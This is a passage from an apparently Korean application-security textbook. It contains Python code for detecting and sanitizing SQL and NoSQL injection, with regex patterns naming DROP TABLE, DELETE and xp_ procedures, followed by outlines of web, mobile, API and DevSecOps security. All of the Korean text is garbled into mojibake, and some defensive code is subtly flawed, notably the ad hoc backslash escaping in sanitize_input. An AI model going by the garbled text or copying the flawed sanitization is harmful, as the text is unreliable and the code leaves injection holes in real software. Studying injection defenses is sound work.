            r"((\s)*(delete)(\s)+(.)*(\s)+(from)(\s)+)",  # DELETE ë¬¸
            r"((\s)*(drop)(\s)+(table|database)(\s)+)",  # DROP ë¬¸
            r"((\s)*(exec|execute)(\s)*(\()?(\s)*)",  # ì‹¤í–‰ ëª…ë ¹
            r"((\s)*(sp_|xp_))",  # SQL Server í™•ì¥ í”„ë¡œì‹œì €
        ]

    def detect_sql_injection(self, input_value: str) -> Dict[str, Any]:
        """SQL ì¸ì ì…˜ íŒ¨í„´ íƒì§€"""
        detection_result = {
            'is_malicious': False,
            'patterns_found': [],
            'risk_level': 'low',
            'sanitized_input': input_value
        }

        if not isinstance(input_value, str):
            return detection_result

        # íŒ¨í„´ ë§¤ì¹­
        for i, pattern in enumerate(self.injection_patterns):
            if re.search(pattern, input_value, re.IGNORECASE):
                detection_result['is_malicious'] = True
                detection_result['patterns_found'].append({
                    'pattern_id': i,
                    'pattern': pattern,
                    'matched_text': re.search(pattern, input_value, re.IGNORECASE).group()
                })

        # ìœ„í—˜ë„ í‰ê°€
        pattern_count = len(detection_result['patterns_found'])
        if pattern_count >= 3:
            detection_result['risk_level'] = 'critical'
        elif pattern_count >= 2:
            detection_result['risk_level'] = 'high'
        elif pattern_count >= 1:
            detection_result['risk_level'] = 'medium'

        # ë¡œê¹…
        if detection_result['is_malicious']:
            self.logger.warning(f"SQL injection detected: {input_value}")

        return detection_result

    def sanitize_input(self, input_value: str) -> str:
        """ì…ë ¥ê°’ ì •í™”"""
        if not isinstance(input_value, str):
            return str(input_value)

        # SQL ë©”íƒ€ë¬¸ì ì´ìŠ¤ì¼€ì´í”„
        sanitized = input_value.replace("'", "''")
        sanitized = sanitized.replace(";", "\\;")
        sanitized = sanitized.replace("--", "\\--")
        sanitized = sanitized.replace("/*", "\\/\\*")
        sanitized = sanitized.replace("*/", "\\*\\/")

        return sanitized

    def execute_safe_query(self, query: str, parameters: tuple = ()) -> List[Dict]:
        """ì•ˆì „í•œ ì¿¼ë¦¬ ì‹¤í–‰"""
        # ì¿¼ë¦¬ ìì²´ì— ëŒ€í•œ ê¸°ë³¸ ê²€ì¦
        if any(keyword in query.upper() for keyword in ['DROP', 'TRUNCATE', 'DELETE']):
            if not self.is_authorized_for_destructive_operations():
                raise ValueError("Destructive operations not authorized")

        try:
            cursor = self.conn.cursor()
            cursor.execute(query, parameters)

            if query.strip().upper().startswith('SELECT'):
                columns = [desc[0] for desc in cursor.description]
                results = []
                for row in cursor.fetchall():
                    results.append(dict(zip(columns, row)))
                return results
            else:
                self.conn.commit()
                return [{'affected_rows': cursor.rowcount}]

        except sqlite3.Error as e:
            self.logger.error(f"Database error: {e}")
            raise

    def is_authorized_for_destructive_operations(self) -> bool:
        """íŒŒê´´ì  ì‘ì—… ê¶Œí•œ í™•ì¸"""
        # ì‹¤ì œ êµ¬í˜„ì—ì„œëŠ” ì‚¬ìš©ì ê¶Œí•œ í™•ì¸
        return False

# ì•ˆì „í•œ ORM ìŠ¤íƒ€ì¼ ì¿¼ë¦¬ ë¹Œë”
class SecureQueryBuilder:
    def __init__(self, table_name: str):
        self.table_name = self._validate_table_name(table_name)
        self.select_fields = []
        self.where_conditions = []
        self.parameters = []

    def _validate_table_name(self, name: str) -> str:
        """í…Œì´ë¸”ëª… ê²€ì¦"""
        if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', name):
            raise ValueError(f"Invalid table name: {name}")
        return name

    def select(self, *fields) -> 'SecureQueryBuilder':
        """SELECT í•„ë“œ ì„¤ì •"""
        validated_fields = []
        for field in fields:
            if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', field):
                raise ValueError(f"Invalid field name: {field}")
            validated_fields.append(field)
        self.select_fields = validated_fields
        return self

    def where(self, field: str, operator: str, value: Any) -> 'SecureQueryBuilder':
        """WHERE ì¡°ê±´ ì¶”ê°€"""
        # í•„ë“œëª… ê²€ì¦
        if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', field):
            raise ValueError(f"Invalid field name: {field}")

        # ì—°ì‚°ì ê²€ì¦
        allowed_operators = ['=', '!=', '<', '>', '<=', '>=', 'LIKE', 'IN']
        if operator not in allowed_operators:
            raise ValueError(f"Invalid operator: {operator}")

        self.where_conditions.append(f"{field} {operator} ?")
        self.parameters.append(value)
        return self

    def build(self) -> tuple:
        """ì¿¼ë¦¬ ë¹Œë“œ"""
        fields = ', '.join(self.select_fields) if self.select_fields else '*'
        query = f"SELECT {fields} FROM {self.table_name}"

        if self.where_conditions:
            query += " WHERE " + " AND ".join(self.where_conditions)

        return query, tuple(self.parameters)

# ì‚¬ìš© ì˜ˆì‹œ
def secure_user_lookup(user_id: int, username: str) -> Optional[Dict]:
    """ì•ˆì „í•œ ì‚¬ìš©ì ì¡°íšŒ"""
    builder = SecureQueryBuilder('users')
    query, params = (builder
                    .select('id', 'username', 'email', 'role')
                    .where('id', '=', user_id)
                    .where('username', '=', username)
                    .build())

    # SQLInjectionDefense ì‚¬ìš©
    defense = SQLInjectionDefense(get_db_connection())
    results = defense.execute_safe_query(query, params)

    return results[0] if results else None

# NoSQL ì¸ì ì…˜ ë°©ì–´
class NoSQLInjectionDefense:
    @staticmethod
    def sanitize_mongodb_query(query_dict: dict) -> dict:
        """MongoDB ì¿¼ë¦¬ ì •í™”"""
        def recursive_sanitize(obj):
            if isinstance(obj, dict):
                sanitized = {}
                for key, value in obj.items():
                    # $ ì—°ì‚°ì ê²€ì¦
                    if key.startswith('$'):
                        allowed_operators = ['$eq', '$ne', '$gt', '$gte', '$lt', '$lte', '$in', '$nin']
                        if key not in allowed_operators:
                            continue  # ìœ„í—˜í•œ ì—°ì‚°ì ì œê±°

                    sanitized[key] = recursive_sanitize(value)
                return sanitized

            elif isinstance(obj, list):
                return [recursive_sanitize(item) for item in obj]

            elif isinstance(obj, str):
                # JavaScript í•¨ìˆ˜ ì£¼ì… ë°©ì§€
                if any(keyword in obj for keyword in ['function', 'eval', '$where']):
                    return ""
                return obj

            return obj

        return recursive_sanitize(query_dict)
```

#### 4.2.2 ì›¹ ì„œë¹„ìŠ¤ ë³´ì•ˆ

##### REST API ë³´ì•ˆ

- **ì¸ì¦**: JWT (JSON Web Token), OAuth 2.0
- **ê¶Œí•œ ë¶€ì—¬**: ì—­í•  ê¸°ë°˜ ì ‘ê·¼ ì œì–´ (RBAC)
- **ì…ë ¥ ê²€ì¦**: JSON ìŠ¤í‚¤ë§ˆ ê²€ì¦
- **HTTPS ê°•ì œ**: ëª¨ë“  í†µì‹  ì•”í˜¸í™”
- **Rate Limiting**: API í˜¸ì¶œ íšŸìˆ˜ ì œí•œ

##### SOAP ë³´ì•ˆ

- **WS-Security**: SOAP ë©”ì‹œì§€ ë³´ì•ˆ í‘œì¤€
- **XML ì„œëª…**: ë©”ì‹œì§€ ë¬´ê²°ì„± ë³´ì¥
- **XML ì•”í˜¸í™”**: ë©”ì‹œì§€ ê¸°ë°€ì„± ë³´ì¥
- **SAML**: ì¸ì¦ ë° ê¶Œí•œ ë¶€ì—¬ í‘œì¤€

##### GraphQL ë³´ì•ˆ

- **ì¿¼ë¦¬ ë³µì¡ë„ ë¶„ì„**: ë³µì¡í•œ ì¿¼ë¦¬ ì œí•œ
- **ì¿¼ë¦¬ í™”ì´íŠ¸ë¦¬ìŠ¤íŒ…**: í—ˆê°€ëœ ì¿¼ë¦¬ë§Œ ì‹¤í–‰
- **ê¹Šì´ ì œí•œ**: ì¤‘ì²© ì¿¼ë¦¬ ê¹Šì´ ì œí•œ
- **Rate Limiting**: ì¿¼ë¦¬ ì‹¤í–‰ íšŸìˆ˜ ì œí•œ

#### 4.2.3 ì›¹ ë¸Œë¼ìš°ì € ë³´ì•ˆ

##### ë™ì¼ ì¶œì²˜ ì •ì±… (Same-Origin Policy)

- **ì •ì˜**: ê°™ì€ í”„ë¡œí† ì½œ, ë„ë©”ì¸, í¬íŠ¸ì˜ ë¦¬ì†ŒìŠ¤ë§Œ ì ‘ê·¼ í—ˆìš©
- **ìš°íšŒ ë°©ë²•**: CORS (Cross-Origin Resource Sharing)
- **ë³´ì•ˆ ì˜ë¯¸**: XSS, CSRF ë“±ì˜ ê³µê²© ì œí•œ

##### ì½˜í…ì¸  ë³´ì•ˆ ì •ì±… (CSP: Content Security Policy)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```
- **ìŠ¤í¬ë¦½íŠ¸ ì†ŒìŠ¤ ì œí•œ**: script-src ì§€ì‹œì–´
- **ìŠ¤íƒ€ì¼ ì†ŒìŠ¤ ì œí•œ**: style-src ì§€ì‹œì–´
- **ì´ë¯¸ì§€ ì†ŒìŠ¤ ì œí•œ**: img-src ì§€ì‹œì–´
- **nonce ì‚¬ìš©**: ì¼íšŒìš© í† í°ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ í—ˆìš©

##### HTTP ë³´ì•ˆ í—¤ë”

- **Strict-Transport-Security (HSTS)**: HTTPS ê°•ì œ
- **X-Frame-Options**: í´ë¦­ì¬í‚¹ ë°©ì§€
- **X-Content-Type-Options**: MIME íƒ€ì… ìŠ¤ë‹ˆí•‘ ë°©ì§€
- **X-XSS-Protection**: ë¸Œë¼ìš°ì € XSS í•„í„° í™œì„±í™”
- **Referrer-Policy**: Referrer ì •ë³´ ì œì–´

#### 4.2.4 ì„¸ì…˜ ê´€ë¦¬

##### ì„¸ì…˜ ë³´ì•ˆ

- **ì„¸ì…˜ ID ìƒì„±**: ì¶©ë¶„í•œ ì—”íŠ¸ë¡œí”¼ í™•ë³´
- **ì„¸ì…˜ ID ì „ì†¡**: HTTPS ë¡œ ì „ì†¡, Secure ì¿ í‚¤
- **ì„¸ì…˜ íƒ€ì„ì•„ì›ƒ**: ë¹„í™œì„± ì„¸ì…˜ ìë™ ì¢…ë£Œ
- **ì„¸ì…˜ ë¬´íš¨í™”**: ë¡œê·¸ì•„ì›ƒ ì‹œ ì„œë²„ ì¸¡ ì„¸ì…˜ ì‚­ì œ

##### ì¿ í‚¤ ë³´ì•ˆ
- **Secure í”Œë˜ê·¸**: HTTPS ì—°ê²°ì—ì„œë§Œ ì „ì†¡
- **HttpOnly í”Œë˜ê·¸**: JavaScript ì ‘ê·¼ ê¸ˆì§€
- **SameSite í”Œë˜ê·¸**: CSRF ê³µê²© ë°©ì§€
- **Domain/Path ì œí•œ**: ì¿ í‚¤ ì‚¬ìš© ë²”ìœ„ ì œí•œ

### 4.3 ëª¨ë°”ì¼ ì• í”Œë¦¬ì¼€ì´ì…˜ ë³´ì•ˆ

#### 4.3.1 ëª¨ë°”ì¼ ë³´ì•ˆ ìœ„í˜‘

##### OWASP Mobile Top 10 (2016)

1. **M1: ë¶€ì ì ˆí•œ í”Œë«í¼ ì‚¬ìš©**
2. **M2: ì•ˆì „í•˜ì§€ ì•Šì€ ë°ì´í„° ì €ì¥**
3. **M3: ì•ˆì „í•˜ì§€ ì•Šì€ í†µì‹ **
4. **M4: ì•ˆì „í•˜ì§€ ì•Šì€ ì¸ì¦**
5. **M5: ë¶ˆì¶©ë¶„í•œ ì•”í˜¸í™”**
6. **M6: ì•ˆì „í•˜ì§€ ì•Šì€ ê¶Œí•œ ë¶€ì—¬**
7. **M7: í´ë¼ì´ì–¸íŠ¸ ì½”ë“œ í’ˆì§ˆ**
8. **M8: ì½”ë“œ ë³€ì¡°**
9. **M9: ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§**
10. **M10: ê´€ë ¨ ì—†ëŠ” ê¸°ëŠ¥**

##### ëª¨ë°”ì¼ íŠ¹í™” ìœ„í˜‘

- **ì•± ë¦¬íŒ¨í‚¤ì§•**: ì •ìƒ ì•±ì— ì•…ì„± ì½”ë“œ ì‚½ì…
- **ì•± ìŠ¤í† ì–´ ì•…ì„±ì•±**: ê°€ì§œ ì•±ìœ¼ë¡œ ì •ë³´ íƒˆì·¨
- **ëª¨ë°”ì¼ ë§¬ì›¨ì–´**: ìŠ¤ë§ˆíŠ¸í° íƒ€ê²Ÿ ì•…ì„±ì½”ë“œ
- **SMS í”¼ì‹±**: ë¬¸ì ë©”ì‹œì§€ ê¸°ë°˜ í”¼ì‹±
- **QR ì½”ë“œ ê³µê²©**: ì•…ì„± QR ì½”ë“œ ìŠ¤ìº” ìœ ë„

#### 4.3.2 Android ë³´ì•ˆ

##### Android ë³´ì•ˆ ì•„í‚¤í…ì²˜

- **Linux ì»¤ë„**: í”„ë¡œì„¸ìŠ¤ ê²©ë¦¬, ê¶Œí•œ ê´€ë¦¬
- **ì• í”Œë¦¬ì¼€ì´ì…˜ ìƒŒë“œë°•ìŠ¤**: ì•±ë³„ ë…ë¦½ëœ ì‹¤í–‰ í™˜ê²½
- **ê¶Œí•œ ëª¨ë¸**: ëª…ì‹œì  ê¶Œí•œ ìš”ì²­ ë° ìŠ¹ì¸
- **SELinux**: ê°•ì œ ì ‘ê·¼ ì œì–´ (MAC)

##### Android ë³´ì•ˆ ê¸°ëŠ¥

- **ì•± ì„œëª…**: ê°œë°œì ì‹ ì› í™•ì¸ ë° ë¬´ê²°ì„± ë³´ì¥
- **ê¶Œí•œ ì‹œìŠ¤í…œ**: ìœ„í—˜í•œ ê¶Œí•œì˜ ëŸ°íƒ€ì„ ìš”ì²­
- **Google Play Protect**: ì•…ì„± ì•± íƒì§€ ë° ì œê±°
- **Verified Boot**: ë¶€íŒ… ê³¼ì • ë¬´ê²°ì„± ê²€ì¦

##### Android ì·¨ì•½ì 

- **ë£¨íŒ…**: ê´€ë¦¬ì ê¶Œí•œ íšë“ìœ¼ë¡œ ë³´ì•ˆ ìš°íšŒ
- **ì•…ì„± ì•±**: ê¶Œí•œ ë‚¨ìš©, ê°œì¸ì •ë³´ ìœ ì¶œ
- **ì¤‘ê°„ì ê³µê²©**: ì•ˆì „í•˜ì§€ ì•Šì€ ë„¤íŠ¸ì›Œí¬ í†µì‹ 
- **ì‚¬ì´ë“œë¡œë”©**: Play ìŠ¤í† ì–´ ì™¸ë¶€ ì•± ì„¤ì¹˜

#### 4.3.3 iOS ë³´ì•ˆ

##### iOS ë³´ì•ˆ ì•„í‚¤í…ì²˜

- **Secure Enclave**: ë³´ì•ˆ í”„ë¡œì„¸ì„œ
- **ì½”ë“œ ì„œëª…**: ì•± ì‹¤í–‰ ì „ ì„œëª… ê²€ì¦
- **ìƒŒë“œë°•ìŠ¤**: ì•±ë³„ ê²©ë¦¬ëœ ì‹¤í–‰ í™˜ê²½
- **ASLR**: ì£¼ì†Œ ê³µê°„ ë ˆì´ì•„ì›ƒ ëœë¤í™”

##### iOS ë³´ì•ˆ ê¸°ëŠ¥

- **Touch ID/Face ID**: ìƒì²´ ì¸ì¦
- **Keychain**: ì•”í˜¸ ë° ì¸ì¦ì„œ ì•ˆì „ ì €ì¥
- **App Transport Security**: HTTPS í†µì‹  ê°•ì œ
- **System Integrity Protection**: ì‹œìŠ¤í…œ íŒŒì¼ ë³´í˜¸

##### iOS ì·¨ì•½ì 

- **íƒˆì˜¥**: iOS ë³´ì•ˆ ë©”ì»¤ë‹ˆì¦˜ ìš°íšŒ
- **ì•…ì„± í”„ë¡œíŒŒì¼**: ì—”í„°í”„ë¼ì´ì¦ˆ ì¸ì¦ì„œ ë‚¨ìš©
- **í”¼ì‹± ì•±**: App Store ê²€í†  ìš°íšŒ
- **ì¤‘ê°„ì ê³µê²©**: ì¸ì¦ì„œ í”¼ë‹ ìš°íšŒ

#### 4.3.4 ëª¨ë°”ì¼ ì•± ë³´ì•ˆ ê°œë°œ

##### ë³´ì•ˆ ì½”ë”© ê°€ì´ë“œë¼ì¸

- **ë¯¼ê°í•œ ë°ì´í„° ë³´í˜¸**: ì•”í˜¸í™” ì €ì¥, ë©”ëª¨ë¦¬ í´ë¦¬ì–´
- **ì•ˆì „í•œ í†µì‹ **: HTTPS, ì¸ì¦ì„œ í”¼ë‹
- **ì¸ì¦ ê°•í™”**: ë‹¤ì¤‘ ì¸ì¦, ìƒì²´ ì¸ì¦
- **ê¶Œí•œ ìµœì†Œí™”**: í•„ìš”í•œ ê¶Œí•œë§Œ ìš”ì²­
- **ì½”ë“œ ë‚œë…í™”**: ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ ë°©ì§€

##### ëª¨ë°”ì¼ ì•± í…ŒìŠ¤íŠ¸

- **ì •ì  ë¶„ì„**: ì†ŒìŠ¤ì½”ë“œ ë˜ëŠ” ë°”ì´ë„ˆë¦¬ ë¶„ì„
- **ë™ì  ë¶„ì„**: ì‹¤í–‰ ì¤‘ ì•± ë™ì‘ ë¶„ì„
- **ëŒ€í™”í˜• ë¶„ì„**: ì‹¤ì‹œê°„ ë””ë²„ê¹… ë° ì¡°ì‘
- **í¼ì§€ í…ŒìŠ¤íŠ¸**: ë¬´ì‘ìœ„ ì…ë ¥ì„ í†µí•œ ì·¨ì•½ì  ë°œê²¬

### 4.4 API ë° ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë³´ì•ˆ

#### 4.4.1 API ë³´ì•ˆ

##### API ì¸ì¦ ë°©ì‹

- **API í‚¤**: ë‹¨ìˆœí•œ ë¬¸ìì—´ ê¸°ë°˜ ì¸ì¦
- **OAuth 2.0**: ê¶Œí•œ ë¶€ì—¬ í”„ë ˆì„ì›Œí¬
- **JWT (JSON Web Token)**: í† í° ê¸°ë°˜ ì¸ì¦
- **mTLS (Mutual TLS)**: ìƒí˜¸ TLS ì¸ì¦

##### OAuth 2.0

- **ì¸ì¦ íë¦„**:
  - Authorization Code Flow
  - Implicit Flow
  - Resource Owner Password Credentials Flow
  - Client Credentials Flow
- **êµ¬ì„± ìš”ì†Œ**:
  - Resource Server: API ì„œë²„
  - Authorization Server: ì¸ì¦ ì„œë²„
  - Client: í´ë¼ì´ì–¸íŠ¸ ì• í”Œë¦¬ì¼€ì´ì…˜
  - Resource Owner: ì‚¬ìš©ì

##### JWT (JSON Web Token)

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "sub": "user123",
    "exp": 1516239022,
    "iat": 1516239022
  }
}
```
- **êµ¬ì¡°**: Header.Payload.Signature
- **ì¥ì **: ìƒíƒœ ì—†ìŒ, í™•ì¥ì„±
- **ì£¼ì˜ì‚¬í•­**: ë¹„ë°€í‚¤ ê´€ë¦¬, ë§Œë£Œì‹œê°„ ì„¤ì •

#### 4.4.2 API ë³´ì•ˆ ìœ„í˜‘

##### API ì·¨ì•½ì 

- **ì¸ì¦ ìš°íšŒ**: ì•½í•œ ì¸ì¦ ë©”ì»¤ë‹ˆì¦˜
- **ê¶Œí•œ ë¶€ì—¬ ì˜¤ë¥˜**: ë¶€ì ì ˆí•œ ì ‘ê·¼ ì œì–´
- **ë°ì´í„° ë…¸ì¶œ**: ê³¼ë„í•œ ì •ë³´ ë°˜í™˜
- **Rate Limiting ë¶€ì¬**: ë‚¨ìš© ê°€ëŠ¥ì„±
- **ì…ë ¥ ê²€ì¦ ë¶€ì¡±**: ì¸ì ì…˜ ê³µê²©

##### OWASP API Security Top 10

1. **API1: ê°ì²´ ìˆ˜ì¤€ ê¶Œí•œ ë¶€ì—¬ ì·¨ì•½ì **
2. **API2: ì‚¬ìš©ì ì¸ì¦ ì·¨ì•½ì **
3. **API3: ê³¼ë„í•œ ë°ì´í„° ë…¸ì¶œ**
4. **API4: ìì› ë¶€ì¡± ë° ë¹„ìœ¨ ì œí•œ**
5. **API5: í•¨ìˆ˜ ìˆ˜ì¤€ ê¶Œí•œ ë¶€ì—¬ ì·¨ì•½ì **
6. **API6: ëŒ€ëŸ‰ í• ë‹¹**
7. **API7: ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜**
8. **API8: ì¸ì ì…˜**
9. **API9: ë¶€ì ì ˆí•œ ìì‚° ê´€ë¦¬**
10. **API10: ë¶ˆì¶©ë¶„í•œ ë¡œê¹… ë° ëª¨ë‹ˆí„°ë§**

#### 4.4.3 ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë³´ì•ˆ

##### ë§ˆì´í¬ë¡œì„œë¹„ìŠ¤ ë³´ì•ˆ ë„ì „ê³¼ì œ

- **ì„œë¹„ìŠ¤ ê°„ í†µì‹ **: ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ ë³´ì•ˆ
- **ë¶„ì‚° ì¸ì¦**: ì—¬ëŸ¬ ì„œë¹„ìŠ¤ ê°„ ì¼ê´€ëœ ì¸ì¦
- **ë°ì´í„° ì¼ê´€ì„±**: ë¶„ì‚° íŠ¸ëœì­ì…˜ ë³´ì•ˆ
- **ëª¨ë‹ˆí„°ë§ ë³µì¡ì„±**: ë‹¤ìˆ˜ ì„œë¹„ìŠ¤ í†µí•© ëª¨ë‹ˆí„°ë§

##### ì„œë¹„ìŠ¤ ë©”ì‹œ ë³´ì•ˆ

- **Istio**: ì„œë¹„ìŠ¤ ë©”ì‹œ í”Œë«í¼
- **mTLS**: ì„œë¹„ìŠ¤ ê°„ ìƒí˜¸ ì¸ì¦
- **ë„¤íŠ¸ì›Œí¬ ì •ì±…**: ë§ˆì´í¬ë¡œ ì„¸ê·¸ë©˜í…Œì´ì…˜
- **ë³´ì•ˆ ê²Œì´íŠ¸ì›¨ì´**: ì™¸ë¶€ ì ‘ê·¼ ì œì–´ì 

##### ì»¨í…Œì´ë„ˆ ë³´ì•ˆ
- **ì´ë¯¸ì§€ ìŠ¤ìº”**: ì·¨ì•½ì  ìˆëŠ” ë² ì´ìŠ¤ ì´ë¯¸ì§€ ê²€ì¶œ
- **ëŸ°íƒ€ì„ ë³´ì•ˆ**: ì»¨í…Œì´ë„ˆ ì‹¤í–‰ ì‹œ ë³´ì•ˆ ëª¨ë‹ˆí„°ë§
- **ë„¤íŠ¸ì›Œí¬ ë¶„í• **: ì»¨í…Œì´ë„ˆ ê°„ ë„¤íŠ¸ì›Œí¬ ê²©ë¦¬
- **ë¹„ë°€ ì •ë³´ ê´€ë¦¬**: ì»¨í…Œì´ë„ˆ í™˜ê²½ì—ì„œ ì•ˆì „í•œ ë¹„ë°€ ê´€ë¦¬

### 4.5 DevSecOps ì™€ ë³´ì•ˆ í…ŒìŠ¤íŠ¸

#### 4.5.1 DevSecOps

##### DevSecOps ì›ì¹™

- **Shift-Left Security**: ê°œë°œ ì´ˆê¸° ë‹¨ê³„ì— ë³´ì•ˆ í†µí•©
- **ìë™í™”**: ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ë° ë°°í¬ ìë™í™”
- **ì§€ì†ì  ëª¨ë‹ˆí„°ë§**: ì‹¤ì‹œê°„ ë³´ì•ˆ ìƒíƒœ í™•ì¸
- **í˜‘ì—…**: ê°œë°œ, ë³´ì•ˆ, ìš´ì˜íŒ€ ê°„ í˜‘ë ¥

##### CI/CD íŒŒì´í”„ë¼ì¸ ë³´ì•ˆ

- **ì†ŒìŠ¤ ì½”ë“œ ê´€ë¦¬**: Git ì €ì¥ì†Œ ë³´ì•ˆ
- **ë¹Œë“œ ë³´ì•ˆ**: ì˜ì¡´ì„± ì·¨ì•½ì  ê²€ì‚¬
- **í…ŒìŠ¤íŠ¸ ìë™í™”**: SAST, DAST í†µí•©
- **ë°°í¬ ë³´ì•ˆ**: ì¸í”„ë¼ ì½”ë“œ ê²€ì¦

#### 4.5.2 ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ìë™í™”

##### SAST (Static Application Security Testing)

- **ì •ì  ë¶„ì„**: ì†ŒìŠ¤ì½”ë“œ ë˜ëŠ” ë°”ì´ë„ˆë¦¬ ë¶„ì„
- **ë„êµ¬**: SonarQube, Checkmarx, Veracode
- **ì¥ì **: ê°œë°œ ì´ˆê¸° ë‹¨ê³„ ì·¨ì•½ì  ë°œê²¬
- **í•œê³„**: ëŸ°íƒ€ì„ ì·¨ì•½ì  íƒì§€ ë¶ˆê°€

##### DAST (Dynamic Application Security Testing)

- **ë™ì  ë¶„ì„**: ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ í…ŒìŠ¤íŠ¸
- **ë„êµ¬**: OWASP ZAP, Burp Suite, Nessus
- **ì¥ì **: ì‹¤ì œ ìš´ì˜ í™˜ê²½ ì·¨ì•½ì  ë°œê²¬
- **í•œê³„**: ì½”ë“œ ì»¤ë²„ë¦¬ì§€ ì œí•œ

##### IAST (Interactive Application Security Testing)

- **ëŒ€í™”í˜• ë¶„ì„**: ì‹¤í–‰ ì¤‘ ì½”ë“œ ë¶„ì„
- **ë„êµ¬**: Contrast Security, Seeker
- **ì¥ì **: ë‚®ì€ ì˜¤íƒìœ¨, ì •í™•í•œ ì·¨ì•½ì  ìœ„ì¹˜
- **í•œê³„**: ì„±ëŠ¥ ì˜¤ë²„í—¤ë“œ

##### SCA (Software Composition Analysis)

- **ì˜ì¡´ì„± ë¶„ì„**: ì˜¤í”ˆì†ŒìŠ¤ êµ¬ì„± ìš”ì†Œ ì·¨ì•½ì  ê²€ì‚¬
- **ë„êµ¬**: OWASP Dependency Check, Snyk, WhiteSource
- **ê¸°ëŠ¥**: ë¼ì´ì„ ìŠ¤ ê²€ì¦, ì·¨ì•½ì  ì¶”ì 
- **ì¤‘ìš”ì„±**: ì˜¤í”ˆì†ŒìŠ¤ ì‚¬ìš© ì¦ê°€ì— ë”°ë¥¸ í•„ìš”ì„±

#### 4.5.3 ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ë°©ë²•ë¡ 

##### ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸

- **ê³„íš**: í…ŒìŠ¤íŠ¸ ë²”ìœ„ ë° ê·œì¹™ ì •ì˜
- **ì •ì°°**: ëŒ€ìƒ ì‹œìŠ¤í…œ ì •ë³´ ìˆ˜ì§‘
- **ìŠ¤ìº”**: ì·¨ì•½ì  ìŠ¤ìº” ë° ë¶„ì„
- **ê³µê²©**: ì·¨ì•½ì  ì•…ìš© ì‹œë„
- **ë³´ê³ **: ë°œê²¬ëœ ì·¨ì•½ì  ë° ëŒ€ì‘ë°©ì•ˆ ë³´ê³ 

##### ë³´ì•ˆ ì½”ë“œ ê²€í† 

- **ìˆ˜ë™ ê²€í† **: ì „ë¬¸ê°€ì˜ ì§ì ‘ ì½”ë“œ ë¶„ì„
- **ìë™í™” ë„êµ¬**: ì •ì  ë¶„ì„ ë„êµ¬ í™œìš©
- **ì²´í¬ë¦¬ìŠ¤íŠ¸**: ë³´ì•ˆ ì½”ë”© ê°€ì´ë“œë¼ì¸ ì¤€ìˆ˜ í™•ì¸
- **ë™ë£Œ ê²€í† **: ê°œë°œíŒ€ ë‚´ ìƒí˜¸ ê²€í† 

#### 4.5.4 ì·¨ì•½ì  ê´€ë¦¬

##### ì·¨ì•½ì  ìƒëª…ì£¼ê¸°

1. **ë°œê²¬**: ì·¨ì•½ì  ì‹ë³„
2. **ë¶„ì„**: ì˜í–¥ë„ ë° ìš°ì„ ìˆœìœ„ í‰ê°€
3. **í• ë‹¹**: ë‹´ë‹¹ì ì§€ì • ë° ì¼ì • ê³„íš
4. **ìˆ˜ì •**: íŒ¨ì¹˜ ë˜ëŠ” ì™„í™” ì¡°ì¹˜
5. **ê²€ì¦**: ìˆ˜ì • ì‚¬í•­ í™•ì¸
6. **ì¢…ë£Œ**: ì·¨ì•½ì  í•´ê²° ì™„ë£Œ

##### ì·¨ì•½ì  í‰ê°€

- **CVSS (Common Vulnerability Scoring System)**: ì·¨ì•½ì  ì‹¬ê°ë„ ì ìˆ˜í™”
- **ìœ„í—˜ í‰ê°€**: ì·¨ì•½ì ì˜ ë¹„ì¦ˆë‹ˆìŠ¤ ì˜í–¥ í‰ê°€
- **ìš°ì„ ìˆœìœ„**: ì‹¬ê°ë„ì™€ ë…¸ì¶œ ì •ë„ì— ë”°ë¥¸ ì²˜ë¦¬ ìˆœì„œ
- **SLA**: ì‹¬ê°ë„ë³„ ìˆ˜ì • ê¸°í•œ ì„¤ì •